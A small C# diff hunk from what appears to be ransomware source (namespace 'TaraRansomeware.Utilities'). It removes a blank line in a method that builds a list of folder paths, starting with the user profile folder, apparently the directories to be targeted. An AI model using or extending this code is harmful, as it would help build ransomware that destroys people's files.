@@ -11,7 +11,6 @@ namespace TaraRansomeware.Utilities
     {
         public static string[] generate()
         {
-
             List<string> lst = new List<string>();
 
             lst.Add(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile));
